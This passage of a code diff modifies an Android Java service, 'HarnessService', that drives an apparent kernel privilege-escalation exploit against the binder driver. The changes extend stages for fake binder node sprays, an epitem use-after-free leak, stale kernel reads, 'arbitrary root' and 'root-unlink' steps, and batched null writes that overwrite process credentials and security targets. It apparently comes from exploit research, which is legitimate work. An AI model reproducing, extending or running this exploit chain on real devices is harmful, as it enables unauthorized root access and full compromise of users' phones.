+                        " stage=raw-binder-holder-bootstrap" +
+                        " reason=interrupted";
+            } catch (ExecutionException | TimeoutException exception) {
+                rawBinderHolderBootstrapState = "status=fail" +
+                        " stage=raw-binder-holder-bootstrap reason=" +
+                        exception.getClass().getSimpleName();
+            }
+            if (!rawBinderHolderBootstrapState.startsWith("status=pass")) {
+                publish("status=fail stage=chain-addresses " +
+                        chainAddressPrefix + "holder_bootstrap=[" +
+                        rawBinderHolderBootstrapState + "]");
+                finishEpitemLeak();
+                return;
+            }
+        }
+        checkpoint("second-owner-bind-start");
         try {
             unbindService(connection);
             ownerConnectionBound = false;
@@ -1050,7 +1673,10 @@ public final class HarnessService extends Service {
 
     private void resetExtraRawClientSlot(RawClientSlot slot,
                                          boolean clearTokens) {
+        long deathBarrier;
         synchronized (extraRawClientLock) {
+            deathBarrier = slot.deathBarrier;
+            slot.deathBarrier = 0;
             slot.connection = null;
             slot.service = null;
             slot.identity = null;
@@ -1063,6 +1689,9 @@ public final class HarnessService extends Service {
                 slot.pointer = 0;
                 slot.cookie = 0;
             }
+        }
+        if (deathBarrier != 0) {
+            NativeBridge.discardBinderDeathBarrier(deathBarrier);
         }
     }
 
@@ -1098,12 +1727,16 @@ public final class HarnessService extends Service {
             return;
         }
         NativeBridge.releaseFakeNodeSpray();
+        String rawHolderRelease = releaseRawBinderHolders();
+        if (!rawHolderRelease.startsWith("status=pass")) {
+            Log.e(TAG, rawHolderRelease);
+        }
         releaseIsolatedConnections();
         try {
             waitForIsolatedExit(5000);
         } catch (Exception ignored) {
         }
-        isolatedControllerPairs = Collections.emptyList();
+        discardIsolatedDeathBarriers();
         synchronized (isolatedPids) {
             isolatedPids.clear();
         }
@@ -1193,6 +1826,16 @@ public final class HarnessService extends Service {
         return released;
     }
 
+    private void discardIsolatedDeathBarriers() {
+        for (IsolatedControllerPair pair : isolatedControllerPairs) {
+            if (pair != null && pair.deathBarrier != 0) {
+                NativeBridge.discardBinderDeathBarrier(pair.deathBarrier);
+                pair.deathBarrier = 0;
+            }
+        }
+        isolatedControllerPairs = Collections.emptyList();
+    }
+
     private String proveIsolatedRetirementBeforeMutation()
             throws Exception {
         List<IsolatedControllerPair> pairs = Collections.unmodifiableList(
@@ -1207,6 +1850,7 @@ public final class HarnessService extends Service {
         int callerPid = Process.myPid();
         for (IsolatedControllerPair pair : pairs) {
             if (pair == null || pair.controller == null || pair.pid <= 0 ||
+                    pair.deathBarrier == 0 ||
                     pair.pid == callerPid || !controllers.add(pair.controller) ||
                     !pairPids.add(pair.pid)) {
                 return "status=fail stage=isolated-retirement-proof " +
@@ -1232,10 +1876,29 @@ public final class HarnessService extends Service {
             return "status=fail stage=isolated-retirement-proof " +
                     "reason=unbind unbound=" + unbound;
         }
+        long deathDeadline = SystemClock.elapsedRealtime() +
+                TERMINAL_RETIREMENT_TIMEOUT_MS;
+        int deathPassed = 0;
+        for (IsolatedControllerPair pair : pairs) {
+            long remaining = deathDeadline - SystemClock.elapsedRealtime();
+            String death = NativeBridge.awaitBinderDeathBarrier(
+                    pair.deathBarrier,
+                    (int) Math.max(1, Math.min(Integer.MAX_VALUE, remaining)));
+            pair.deathBarrier = 0;
+            if (death.startsWith("status=pass")) {
+                deathPassed++;
+            }
+        }
+        if (deathPassed != 64) {
+            return "status=fail stage=isolated-retirement-proof " +
+                    "reason=binder-death death_passed=" + deathPassed +
+                    " unbound=" + unbound;
+        }
         String proof = NativeBridge.proveIsolatedProcessesRetired(
                 isolatedRetirementGeneration, snapshot, unbound,
                 TERMINAL_RETIREMENT_TIMEOUT_MS);
-        String diagnostic = proof + " unbound=" + unbound;
+        String diagnostic = proof + " unbound=" + unbound +
+                " death_passed=" + deathPassed;
         if (proof.startsWith("status=pass")) {
             isolatedControllerPairs = Collections.emptyList();
             synchronized (isolatedPids) {
@@ -1250,6 +1913,9 @@ public final class HarnessService extends Service {
         terminalJavaRetirementInProgress = true;
         ProcessIdentity terminalRawTarget = rawTargetProcessIdentity;
         ProcessIdentity terminalOwner = ownerProcessIdentity;
+        IBinder terminalRawTargetService = rawTargetService;
+        IBinder terminalOwnerService = ownerService;
+        IBinder terminalAnchorService = anchorHolderService;
         ProcessIdentity terminalMainClient;
         IBinder terminalMainService;
         ServiceConnection terminalMainConnection;
@@ -1301,6 +1967,18 @@ public final class HarnessService extends Service {
             }
             rawClientRetiring = true;
         }
+        if (rawVictimContextsActive) {
+            terminalJavaRetirementStage = "raw-victim-contexts";
+            String rawVictimRelease =
+                    NativeBridge.releaseRawVictimContexts(
+                            RAW_VICTIM_COUNT - 1);
+            if (!rawVictimRelease.startsWith("status=pass")) {
+                throw new IllegalStateException(
+                        "terminal-raw-victim-contexts [" +
+                                rawVictimRelease + "]");
+            }
+            rawVictimContextsActive = false;
+        }
         synchronized (extraRawClientLock) {
             for (RawClientSlot slot : extraRawClientSlots) {
                 if (slot.state == RawClientSlotState.CONSUMED) {
@@ -1338,6 +2016,31 @@ public final class HarnessService extends Service {
             for (RawClientSlot slot : liveExtraSlots) {
                 slot.state = RawClientSlotState.RETIRING;
             }
+        }
+        List<Long> terminalDeathBarriers = new ArrayList<>();
+        for (IBinder service : Arrays.asList(
+                terminalRawTargetService, terminalOwnerService,
+                terminalAnchorService, terminalMainService)) {
+            long barrier = NativeBridge.armBinderDeathBarrier(service);
+            if (barrier == 0) {
+                throw new IllegalStateException(
+                        "terminal-death-barrier-arm");
+            }
+            terminalDeathBarriers.add(barrier);
+        }
+        synchronized (extraRawClientLock) {
+            for (RawClientSlot slot : liveExtraSlots) {
+                if (slot.deathBarrier == 0) {
+                    throw new IllegalStateException(
+                            "terminal-extra-death-barrier-" + slot.index);
+                }
+                terminalDeathBarriers.add(slot.deathBarrier);
+                slot.deathBarrier = 0;
+            }
+        }
+        if (terminalDeathBarriers.size() != liveIdentities.size()) {
+            throw new IllegalStateException(
+                    "terminal-death-barrier-count");
         }
         long deadline = SystemClock.elapsedRealtime() +
                 TERMINAL_RETIREMENT_TIMEOUT_MS;
@@ -1443,54 +2146,50 @@ public final class HarnessService extends Service {
         }
         anchorHolderService = null;
         anchorHolderPid = -1;
-        if (chainEpitemBound) {
-            unbindService(chainEpitemConnection);
-            chainEpitemBound = false;
-        }
         if (ownerConnectionBound) {
             terminalJavaRetirementStage = "owner-unbind";
             unbindService(connection);
             ownerConnectionBound = false;
         }
-        ownerService = null;
-        ownerServicePid = -1;
-        terminalJavaRetirementStage = "owner-retire";
+        terminalJavaRetirementStage = "owner-unbind";
         if (terminalOwner == null ||
                 !isOriginalIdentityLive(terminalOwner)) {
             throw new IllegalStateException(
                     "terminal-owner-identity");
         }
-        String ownerRetire = "nonce=" + rootWatchdogNonce +
-                " owner_pid=" + terminalOwner.pid +
-                " owner_start_time=" + terminalOwner.startTime +
-                " boot_id=" + rootWatchdogBootId +
-                " host_helper_retired=1";
-        writePrivateAtomic("owner-terminal-retire", ownerRetire);
-        File ownerResult = new File(
-                getFilesDir(), "owner-terminal-retirement.result");
-        long ownerRemaining = deadline - SystemClock.elapsedRealtime();
-        if (ownerRemaining <= 0) {
-            throw new IllegalStateException(
-                    "terminal-owner-deadline");
+        if (chainEpitemBound) {
+            unbindService(chainEpitemConnection);
+            chainEpitemBound = false;
         }
-        waitForEither(ownerResult, null,
-                (int) Math.min(Integer.MAX_VALUE, ownerRemaining));
-        String expectedOwnerResult =
+        ownerService = null;
+        ownerServicePid = -1;
+        terminalJavaRetirementStage = "owner-retire";
+        if (isOriginalIdentityLive(terminalOwner)) {
+            Process.killProcess(terminalOwner.pid);
+        }
+        while (isOriginalIdentityLive(terminalOwner) &&
+                SystemClock.elapsedRealtime() < deadline) {
+            Thread.sleep(10);
+        }
+        if (isOriginalIdentityLive(terminalOwner)) {
+            throw new IllegalStateException(
+                    "terminal-owner-retirement-timeout");
+        }
+        String ownerRetirementProof =
                 "status=pass stage=owner-terminal-retirement" +
                 " nonce=" + rootWatchdogNonce +
                 " owner_pid=" + terminalOwner.pid +
                 " owner_start_time=" + terminalOwner.startTime +
                 " boot_id=" + rootWatchdogBootId +
-                " self_exit=1";
-        if (!expectedOwnerResult.equals(readSmall(ownerResult))) {
-            throw new IllegalStateException(
-                    "terminal-owner-result");
-        }
+                " exit_signal=9";
+        writePrivateAtomic("owner-terminal-retirement.result",
+                ownerRetirementProof);
         requiredCheckpoint("terminal-owner-retired");
         credentialTarget = null;
         securityTarget = null;
         controlledNode = null;
         kernelAnchorRetained = 0;
+        rawCurrentProcMarkerRetained = 0;
         rawCohortSiblings = null;
         cohort = null;
         cohortPointers = null;
@@ -1506,11 +2205,25 @@ public final class HarnessService extends Service {
         waitForRetiredIdentities(
                 liveIdentities, retirementRoles, deadline);
         requiredCheckpoint("terminal-process-identities-retired");
+        int terminalDeaths = 0;
+        for (long barrier : terminalDeathBarriers) {
+            long remaining = deadline - SystemClock.elapsedRealtime();
+            String death = NativeBridge.awaitBinderDeathBarrier(
+                    barrier,
+                    (int) Math.max(1, Math.min(Integer.MAX_VALUE, remaining)));
+            if (death.startsWith("status=pass")) {
+                terminalDeaths++;
+            }
+        }
+        if (terminalDeaths != terminalDeathBarriers.size()) {
+            throw new IllegalStateException(
+                    "terminal-death-barrier-wait");
+        }
+        requiredCheckpoint("terminal-binder-deaths-pass");
         releaseExtraRawClientSlots(true);
         rawTargetProcessIdentity = null;
         anchorHolderProcessIdentity = null;
         ownerProcessIdentity = null;
-        Thread.sleep(1500);
         requiredCheckpoint("terminal-process-retirement-settled");
     }
 
@@ -1705,8 +2418,10 @@ public final class HarnessService extends Service {
         String[] names = {
                 "epitem-reader.prepare", "epitem-reader.waiting",
                 "epitem-reader.start", "epitem-reader.fragmented",
+                "epitem-fragment.result",
                 "epitem-preferred-cpu",
                 "epitem-client.queued", "epitem-client.exiting",
+                "epitem-client.death-ready",
                 "epitem-node-tokens.bin", "epitem-leak.unread-ready",
                 "epitem-nodes-decremented", "kmalloc-predrain.released",
                 "blockers-reset.request", "blockers-reset.ready",
@@ -1714,6 +2429,7 @@ public final class HarnessService extends Service {
                 "owner-fragments-cleanup.request",
                 "owner-fragments-cleanup.ready",
                 "owner-terminal-retire",
+                "owner-terminal-retire.trigger",
                 "owner-terminal-retirement.result",
                 "anchor-terminal-arm.result",
                 "epitem-leak.read-enable", "epitem-leak.result",
@@ -1810,6 +2526,23 @@ public final class HarnessService extends Service {
         }
         return new String(java.nio.file.Files.readAllBytes(file.toPath()),
                 StandardCharsets.UTF_8).trim();
+    }
+
+    private boolean prepareTerminalCtlbufRescuePlan(StringBuilder writes)
+            throws Exception {
+        String rescuePlan = NativeBridge.terminalCtlbufRescuePlan(
+                rootWatchdogNonce);
+        writePrivateAtomic("ctlbuf-rescue-plan.result", rescuePlan);
+        writes.append(" ctlbuf_rescue_plan=[")
+                .append(rescuePlan).append("]");
+        if (!rescuePlan.startsWith(
+                "status=pass stage=ctlbuf-rescue-plan ")) {
+            checkpoint("ctlbuf-rescue-plan-failed");
+            return false;
+        }
+        writePrivateAtomic("ctlbuf-rescue.plan", rescuePlan);
+        checkpoint("ctlbuf-rescue-plan-ready");
+        return true;
     }
 
     private static int parsePositiveInt(String value) {
@@ -2194,12 +2927,17 @@ public final class HarnessService extends Service {
 
     private void runNodeAddress(String handleState, boolean fakeCheck) {
         String result;
+        String chainStage = requestedStage;
+        boolean rootFlow = isRootFlow(chainStage);
+        boolean rawHolderCandidate = RAW_BINDER_HOLDER_CANDIDATE &&
+                ("chain-addresses".equals(chainStage) ||
+                 fakeCheck && rootFlow);
         try {
             checkpoint("node-stage-start");
             if (fakeCheck) {
                 writePrivate("controlled-reader.request",
                         "status=requested stage=fake-node-check");
-                if ("root-chain".equals(requestedStage)) {
+                if ("root-chain".equals(chainStage)) {
                     writePrivate("raw-target.multi-export",
                             "status=ready stage=raw-cohort-export");
                     writePrivate("raw-target.deferred-export",
@@ -2221,12 +2959,13 @@ public final class HarnessService extends Service {
                 }
             }
             Intent batchClient = new Intent(this, BatchClientService.class);
-            if (("chain-addresses".equals(requestedStage) ||
-                 isRootFlow()) &&
+            if (("chain-addresses".equals(chainStage) || rootFlow) &&
                     chainSecondOwner) {
                 batchClient.putExtra("owner2", true);
             }
-            startService(batchClient);
+            if (!startEpitemBatchClient(batchClient)) {
+                throw new IllegalStateException("epitem-client-death-arm");
+            }
             File ready = new File(getFilesDir(), "epitem-leak.unread-ready");
             File leak = new File(getFilesDir(), "epitem-leak.result");
             String rawExport =
@@ -2253,10 +2992,31 @@ public final class HarnessService extends Service {
                 if (!ready.exists()) {
                     result = readSmall(leak);
                 } else {
-                    List<IBinder> controllers = bindIsolatedControllers(64);
-                    if (controllers.size() != 64) {
+                    List<IBinder> controllers = rawHolderCandidate
+                            ? Collections.emptyList()
+                            : bindIsolatedControllers(
+                                    REFERENCE_HOLDER_COUNT);
+                    String holderBootstrap = rawHolderCandidate
+                            ? (rawBinderHoldersActive
+                                    ? rawBinderHolderBootstrapState
+                                    : prepareRawBinderHolders())
+                            : "status=pass stage=raw-binder-holder-bootstrap" +
+                                    " skipped=1";
+                    boolean holdersReady = rawHolderCandidate
+                            ? holderBootstrap.startsWith("status=pass")
+                            : controllers.size() == REFERENCE_HOLDER_COUNT;
+                    String holderPrime = holdersReady && rawHolderCandidate
+                            ? primeRawBinderHolders()
+                            : "status=pass stage=raw-binder-holder-prime" +
+                                    " skipped=1";
+                    holdersReady = holdersReady &&
+                            holderPrime.startsWith("status=pass");
+                    if (!holdersReady) {
                         result = "status=fail stage=node-address reason=" +
-                                "isolated-bind bound=" + controllers.size();
+                                "holder-prepare isolated_bound=" +
+                                controllers.size() + " raw=[" +
+                                holderBootstrap + "] prime=[" +
+                                holderPrime + "]";
                     } else {
                         if (!fakeCheck) {
                             queueControlledNode();
@@ -2274,11 +3034,16 @@ public final class HarnessService extends Service {
                             if (rawExport.startsWith("status=pass")) {
                                 controlledPointer = rawControlledPointer;
                                 controlledCookie = rawControlledCookie;
-                                refs = retainRawControlledNode(controllers);
+                                refs = rawHolderCandidate
+                                        ? retainRawRootBinderHolderRefs()
+                                        : retainRawControlledNode(controllers);
                                 if (refs.startsWith("status=pass")) {
-                                    String anchor = retainKernelAnchor(
-                                            controllers,
-                                            controllers.size());
+                                    String anchor = rawHolderCandidate
+                                            ? retainKernelAnchor(
+                                                    RAW_BINDER_HOLDER_COUNT)
+                                            : retainKernelAnchor(
+                                                    controllers,
+                                                    controllers.size());
                                     refs = anchor.startsWith("status=pass")
                                             ? refs + " anchor=[" + anchor + "]"
                                             : "status=fail anchor=[" +
@@ -2288,7 +3053,12 @@ public final class HarnessService extends Service {
                                 refs = "status=fail reason=raw-export";
                             }
                         } else {
-                            refs = retainControlledNode(controllers);
+                            refs = rawHolderCandidate
+                                    ? retainRawBinderHolderRefs() +
+                                            " prime=[" + holderPrime + "]" +
+                                            " bootstrap=[" +
+                                            holderBootstrap + "]"
+                                    : retainControlledNode(controllers);
                         }
                         String enabled = refs.startsWith("status=pass")
                                 ? NativeBridge.enableStaleRead(
@@ -2311,7 +3081,7 @@ public final class HarnessService extends Service {
                             writePrivate("binder-ref.analysis", analysis);
                             if (fakeCheck &&
                                     analysis.startsWith("status=pass")) {
-                                result = isRootFlow()
+                                result = rootFlow
                                         ? runArbitraryRoot(
                                                 handleState + " " +
                                                         rawExport,
@@ -2339,15 +3109,23 @@ public final class HarnessService extends Service {
                     exception.getClass().getSimpleName() + " message=" +
                     String.valueOf(exception.getMessage());
         }
-        if (("chain-addresses".equals(requestedStage) ||
-             isRootFlow()) && chainSecondOwner) {
+        if (rawHolderCandidate && rawBinderHoldersActive) {
+            String release = releaseRawBinderHolders();
+            boolean pass = result.startsWith("status=pass") &&
+                    release.startsWith("status=pass");
+            result = "status=" + (pass ? "pass" : "miss") +
+                    " stage=raw-binder-node-address node=[" + result +
+                    "] release=[" + release + "]";
+        }
+        if (("chain-addresses".equals(chainStage) || rootFlow) &&
+                chainSecondOwner) {
             String combined = "status=" +
                     (result.startsWith("status=pass") ? "pass" : "miss") +
-                    " stage=" + requestedStage + " " + chainAddressPrefix +
+                    " stage=" + chainStage + " " + chainAddressPrefix +
                     "node=[" + result + "]";
             publish(combined);
-            if (!isRootFlow() ||
-                    "primitive-probe".equals(requestedStage) ||
+            if (!rootFlow ||
+                    "primitive-probe".equals(chainStage) ||
                     (!result.startsWith("status=pass") &&
                      !kernelMutationStarted)) {
                 finishEpitemLeak();
@@ -2361,9 +3139,20 @@ public final class HarnessService extends Service {
     private String runFakeNodeCheck(String handleState, String decrement,
                                     String refs, String analysis)
             throws Exception {
-        releaseIsolatedConnections();
-        waitForIsolatedExit(5000);
-        Thread.sleep(1500);
+        String holderRetirement;
+        if (rawBinderHoldersActive) {
+            holderRetirement = releaseRawBinderHolders();
+        } else {
+            releaseIsolatedConnections();
+            waitForIsolatedExit(5000);
+            Thread.sleep(1500);
+            holderRetirement =
+                    "status=pass stage=isolated-holder-retirement";
+        }
+        if (!holderRetirement.startsWith("status=pass")) {
+            return "status=miss stage=fake-node-check holder_retirement=[" +
+                    holderRetirement + "]";
+        }
         String clientExit = queueRawClientAndWaitExit();
         if (!clientExit.startsWith("status=pass")) {
             return "status=miss stage=fake-node-check handle=[" +
@@ -2452,21 +3241,25 @@ public final class HarnessService extends Service {
         checkpoint("arbitrary-read-start");
         boolean mutate = "root-chain".equals(requestedStage);
         String clients = "status=pass stage=raw-extra-skip";
+        FutureTask<String> deferredClientPreparation = null;
         long[] victimPointers = new long[RAW_VICTIM_COUNT];
         long[] victimCookies = new long[RAW_VICTIM_COUNT];
         victimPointers[0] = rawControlledPointer;
         victimCookies[0] = rawControlledCookie;
         writePrivate("raw-extra-export.reply-signal", "0");
-        String isolatedRetirement =
-                proveIsolatedRetirementBeforeMutation();
-        checkpoint(isolatedRetirement.startsWith("status=pass")
-                ? "isolated-retirement-proof-pass"
-                : "isolated-retirement-proof-failed");
+        boolean rawRetirement = rawBinderHoldersActive;
+        String isolatedRetirement = rawRetirement
+                ? "status=pass stage=raw-holder-retirement deferred=1"
+                : proveIsolatedRetirementBeforeMutation();
+        checkpoint(rawRetirement
+                ? "raw-holder-retirement-deferred"
+                : isolatedRetirement.startsWith("status=pass")
+                        ? "isolated-retirement-proof-pass"
+                        : "isolated-retirement-proof-failed");
         if (!isolatedRetirement.startsWith("status=pass")) {
             return "status=miss stage=root-unlink isolated_proof=[" +
                     isolatedRetirement + "]";
         }
-        Thread.sleep(1500);
         String cohortGate = rawCohortSiblings == null
                 ? "status=pass stage=raw-cohort-gate skipped=1"
                 : NativeBridge.validateRawCohort(
@@ -2518,6 +3311,30 @@ public final class HarnessService extends Service {
             return "status=miss stage=root-unlink prepare=[" + prepare +
                     "] first=[" + first + "]";
         }
+        if (rawRetirement) {
+            isolatedRetirement = releaseRawBinderHolders();
+            checkpoint(isolatedRetirement.startsWith("status=pass")
+                    ? "raw-holder-retirement-proof-pass"
+                    : "raw-holder-retirement-proof-failed");
+            if (!isolatedRetirement.startsWith("status=pass")) {
+                return "status=miss stage=root-unlink isolated_proof=[" +
+                        isolatedRetirement + "]";
+            }
+        }
+        if (mutate) {
+            checkpoint("raw-deferred-clients-start");
+            deferredClientPreparation = new FutureTask<>(
+                    this::prepareDeferredRawClients);
+            new Thread(deferredClientPreparation,
+                    "raw-deferred-client-preparation").start();
+        }
+        checkpoint("current-proc-native-start");
+        FutureTask<String> currentProcPreparation = new FutureTask<>(
+                NativeBridge::probeCurrentBinderProc);
+        Thread currentProcWorker = new Thread(
+                currentProcPreparation, "current-proc-probe");
+        currentProcWorker.setDaemon(true);
+        currentProcWorker.start();
         String privateCredential =
                 "status=pass stage=private-credential-skip";
         if (directTerminalCleanup) {
@@ -2552,14 +3369,14 @@ public final class HarnessService extends Service {
             privateCredential = readSmall(arm);
             checkpoint("private-credential-pass");
         }
-        if (mutate) {
-            clients = prepareDeferredRawClients();
-            if (!clients.startsWith("status=pass")) {
-                return "status=miss stage=root-unlink clients=[" +
-                        clients + "]";
-            }
+        String currentProc;
+        try {
+            currentProc = currentProcPreparation.get(
+                    5, TimeUnit.SECONDS);
+        } catch (Exception exception) {
+            currentProc = "status=miss stage=current-binder-proc reason=" +
+                    exception.getClass().getSimpleName();
         }
-        String currentProc = NativeBridge.probeCurrentBinderProc();
         checkpoint(currentProc.startsWith("status=pass")
                 ? "current-proc-pass" : "current-proc-failed");
         if (!currentProc.startsWith("status=pass")) {
@@ -2580,14 +3397,26 @@ public final class HarnessService extends Service {
         }
         String securityTarget;
         if (directInitCred) {
+            checkpoint("direct-init-target-start");
             securityTarget = NativeBridge.prepareDirectInitTarget();
+            checkpoint(securityTarget.startsWith("status=pass")
+                    ? "direct-init-target-profile-pass"
+                    : "direct-init-target-profile-failed");
         } else {
+            checkpoint("security-target-adopt-start");
             securityTarget = NativeBridge.adoptSecurityTarget();
+            checkpoint(securityTarget.startsWith("status=pass")
+                    ? "security-target-adopt-pass"
+                    : "security-target-adopt-failed");
             if (directSecurityCred &&
                     securityTarget.startsWith("status=pass")) {
+                checkpoint("direct-security-profile-start");
                 securityTarget = NativeBridge.prepareDirectSecurityTarget(
                         directSecurityRepair, directCredQuarantine,
                         directTerminalCleanup);
+                checkpoint(securityTarget.startsWith("status=pass")
+                        ? "direct-security-profile-pass"
+                        : "direct-security-profile-failed");
             }
             if (directTerminalCleanup &&
                     securityTarget.startsWith("status=pass")) {
@@ -2597,9 +3426,21 @@ public final class HarnessService extends Service {
                             "status=fail stage=ctlbuf-rescue-profile " +
                             "reason=resources";
                 } else {
-                    securityTarget = NativeBridge.profileCtlbufRescue(
-                            ctlbufModuleFd.getFd(), ctlbufVendorFd.getFd(),
-                            ctlbufUeventdPid);
+                    checkpoint("ctlbuf-rescue-profile-start");
+                    for (int attempt = 0; attempt < 3; attempt++) {
+                        securityTarget = NativeBridge.profileCtlbufRescue(
+                                ctlbufModuleFd.getFd(),
+                                ctlbufVendorFd.getFd(), ctlbufUeventdPid);
+                        if (securityTarget.startsWith("status=pass")) {
+                            break;
+                        }
+                        if (attempt < 2) {
+                            checkpoint("ctlbuf-rescue-profile-retry-ready");
+                        }
+                    }
+                    checkpoint(securityTarget.startsWith("status=pass")
+                            ? "ctlbuf-rescue-profile-pass"
+                            : "ctlbuf-rescue-profile-failed");
                 }
             }
         }
@@ -2618,6 +3459,16 @@ public final class HarnessService extends Service {
             return "status=miss stage=root-unlink security_cache=[" +
                     securityTargetState + "] security=[" +
                     securityTarget + "]";
+        }
+        if (deferredClientPreparation != null) {
+            clients = deferredClientPreparation.get(30, TimeUnit.SECONDS);
+            checkpoint(clients.startsWith("status=pass")
+                    ? "raw-deferred-clients-pass"
+                    : "raw-deferred-clients-failed");
+            if (!clients.startsWith("status=pass")) {
+                return "status=miss stage=root-unlink clients=[" +
+                        clients + "]";
+            }
         }
         if (directActionAfterSecuritySwap) {
             String reSukiStagePlan =
@@ -2675,14 +3526,11 @@ public final class HarnessService extends Service {
                 victimPointers, victimCookies, rawTargetPid)) {
             return "status=miss stage=root-unlink reason=raw-config";
         }
-        StringBuilder victimCaches = new StringBuilder();
-        for (int victim = 1; victim < RAW_VICTIM_COUNT; victim++) {
-            String victimCache = NativeBridge.cacheRawVictimNode(victim);
-            victimCaches.append(" cache").append(victim).append("=[")
-                    .append(victimCache).append("]");
-            if (!victimCache.startsWith("status=pass")) {
-                return "status=miss stage=root-unlink" + victimCaches;
-            }
+        String victimCaches = NativeBridge.cacheRawVictimNodes();
+        if (!victimCaches.startsWith(
+                "status=pass stage=raw-victim-cache-batch ")) {
+            return "status=miss stage=root-unlink cache=[" +
+                    victimCaches + "]";
         }
         StringBuilder writes = new StringBuilder();
         StringBuilder extraExits = new StringBuilder();
@@ -2706,20 +3554,125 @@ public final class HarnessService extends Service {
         int writeStep = 1;
         boolean rootWindowReached = false;
         boolean actionCompleted = false;
-        for (int victim = 1; victim < RAW_VICTIM_COUNT; victim++) {
+        boolean rescuePlanPrepared = false;
+        boolean batchedTerminalWrites = BATCHED_TERMINAL_WRITES &&
+                directTerminalCleanup && directCredentialWrite;
+        if (batchedTerminalWrites) {
+            long[] batchPointers = new long[4];
+            long[] batchCookies = new long[4];
+            for (int index = 0; index < 4; index++) {
+                int victim = index + 1;
+                batchPointers[index] = victimPointers[victim];
+                batchCookies[index] = victimCookies[victim];
+            }
+            requiredCheckpoint("root-write-batch-reclaim-start");
+            int[] workers = new int[4];
+            for (int index = 0; index < 4; index++) {
+                int victim = index + 1;
+                int logicalWrite = index < 2 ? victim : index + 3;
+                checkpoint("root-write-" + logicalWrite +
+                        "-client-exit-start");
+                String extraExit = queueExtraRawClientAndWaitExit(index);
+                checkpoint(extraExit.startsWith("status=pass")
+                        ? "root-write-" + logicalWrite +
+                                "-client-exit-pass"
+                        : "root-write-" + logicalWrite +
+                                "-client-exit-failed");
+                extraExits.append(" extra_exit").append(victim).append("=[")
+                        .append(extraExit).append("]");
+                if (!extraExit.startsWith("status=pass")) {
+                    requiredCheckpoint("root-window-reboot-required");
+                    return "status=miss stage=root-unlink batch_exit=[" +
+                            extraExit + "]";
+                }
+                if (index == 0) {
+                    String batchPrepare =
+                            NativeBridge.prepareRawNullWriteBatch(
+                                    batchPointers, batchCookies,
+                                    getFilesDir().getAbsolutePath());
+                    writes.append(" batch_prepare=[")
+                            .append(batchPrepare).append("]");
+                    checkpoint(batchPrepare.startsWith("status=pass")
+                            ? "root-write-batch-prepare-pass"
+                            : "root-write-batch-prepare-failed");
+                    if (!batchPrepare.startsWith("status=pass")) {
+                        if (batchPrepare.contains("reboot_required=1")) {
+                            requiredCheckpoint(
+                                    "root-window-reboot-required");
+                        }
+                        return "status=miss stage=root-unlink " +
+                                "batch_prepare=[" + batchPrepare + "]";
+                    }
+                }
+                String batchArm = NativeBridge.armRawNullWriteBatchVictim(
+                        victim, batchPointers[index], batchCookies[index],
+                        getFilesDir().getAbsolutePath());
+                writes.append(" batch_arm").append(victim).append("=[")
+                        .append(batchArm).append("]");
+                checkpoint(batchArm.startsWith("status=pass")
+                        ? "root-write-" + logicalWrite +
+                                "-batch-reclaim-pass"
+                        : "root-write-" + logicalWrite +
+                                "-batch-reclaim-failed");
+                if (!batchArm.startsWith("status=pass")) {
+                    requiredCheckpoint("root-window-reboot-required");
+                    return "status=miss stage=root-unlink batch_arm=[" +
+                            batchArm + "]";
+                }
+                File observed = new File(getFilesDir(),
+                        "controlled-reader.result." + victim);
+                waitForEither(observed, null, 120000);
+                String observation = readSmall(observed);
+                workers[index] = parseIntField(
+                        observation, "worker_index=");
+                writes.append(" batch_observation").append(victim)
+                        .append("=[").append(observation).append("]");
+                if (!observation.startsWith("status=ready") ||
+                        !observation.contains("exact_payload=1") ||
+                        workers[index] < 0) {
+                    requiredCheckpoint("root-window-reboot-required");
+                    return "status=miss stage=root-unlink " +
+                            "batch_observation=[" + observation + "]";
+                }
+                String retained =
+                        NativeBridge.retainRawNullWriteBatchVictim(
+                                victim, workers[index]);
+                writes.append(" batch_retain").append(victim).append("=[")
+                        .append(retained).append("]");
+                checkpoint(retained.startsWith("status=pass")
+                        ? "root-write-" + logicalWrite +
+                                "-batch-retain-pass"
+                        : "root-write-" + logicalWrite +
+                                "-batch-retain-failed");
+                if (!retained.startsWith("status=pass")) {
+                    requiredCheckpoint("root-window-reboot-required");
+                    return "status=miss stage=root-unlink " +
+                            "batch_retain=[" + retained + "]";
+                }
+                checkpoint("root-write-" + logicalWrite + "-armed");
+            }
+            checkpoint("root-write-batch-reclaim-pass");
+            checkpoint("root-write-batch-retain-pass");
+        }
+        int writeVictimLimit = batchedTerminalWrites
+                ? 5 : RAW_VICTIM_COUNT;
+        for (int victim = 1; victim < writeVictimLimit; victim++) {
             int logicalWrite = directCredentialWrite ? writeStep : victim;
             int clientIndex = victim - 1;
-            checkpoint("root-write-" + logicalWrite +
-                    "-client-exit-start");
-            String extraExit = queueExtraRawClientAndWaitExit(clientIndex);
-            checkpoint(extraExit.startsWith("status=pass")
-                    ? "root-write-" + logicalWrite + "-client-exit-pass"
-                    : "root-write-" + logicalWrite + "-client-exit-failed");
-            extraExits.append(" extra_exit").append(victim).append("=[")
-                    .append(extraExit).append("]");
-            if (!extraExit.startsWith("status=pass")) {
-                pass = false;
-                break;
+            if (!batchedTerminalWrites) {
+                checkpoint("root-write-" + logicalWrite +
+                        "-client-exit-start");
+                String extraExit = queueExtraRawClientAndWaitExit(clientIndex);
+                checkpoint(extraExit.startsWith("status=pass")
+                        ? "root-write-" + logicalWrite + "-client-exit-pass"
+                        : "root-write-" + logicalWrite +
+                                "-client-exit-failed");
+                extraExits.append(" extra_exit").append(victim).append("=[")
+                        .append(extraExit).append("]");
+                if (!extraExit.startsWith("status=pass")) {
+                    pass = false;
+                    break;
+                }
             }
             long target = NativeBridge.rootWriteTarget(logicalWrite);
             if (target == 0) {
@@ -2728,25 +3681,27 @@ public final class HarnessService extends Service {
                 pass = false;
                 break;
             }
-            String arm = NativeBridge.prepareRawNullWrite(
-                    target, victim, victimPointers[victim],
-                    victimCookies[victim],
-                    getFilesDir().getAbsolutePath());
-            checkpoint(arm.startsWith("status=pass")
-                    ? "root-write-" + logicalWrite + "-armed"
-                    : "root-write-" + logicalWrite + "-arm-failed");
-            if (!arm.startsWith("status=pass")) {
-                writes.append(" arm").append(logicalWrite).append("=[")
-                        .append(arm).append("]");
-                if (directCredentialWrite && arm.contains(
-                        "stage=null-write-prepare reason=preflight")) {
-                    internalWriteMisses++;
-                    checkpoint("root-write-" + logicalWrite +
-                            "-preflight-retry-ready");
-                    continue;
+            if (!batchedTerminalWrites) {
+                String arm = NativeBridge.prepareRawNullWrite(
+                        target, victim, victimPointers[victim],
+                        victimCookies[victim],
